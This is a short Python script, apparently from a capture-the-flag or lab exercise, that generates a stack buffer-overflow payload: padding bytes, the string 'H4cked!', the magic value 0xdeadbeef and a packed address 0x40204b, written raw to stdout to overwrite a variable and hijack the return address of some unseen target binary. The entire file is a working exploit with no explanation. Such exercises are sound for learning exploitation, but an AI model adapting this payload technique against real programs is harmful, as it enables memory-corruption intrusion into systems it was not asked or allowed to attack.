import sys
from struct import pack

buf = b'a'*0x10
buf += b'H4cked!'.ljust(0x14, b'\x00')
# buf += b'\xef\xbe\xad\xde'
# buf += b'\x4b\x20\x40\x00'
buf += pack('<IQ', 0xdeadbeef, 0x40204b)

# print(buf.decode(), end='')
sys.stdout.buffer.write(buf)
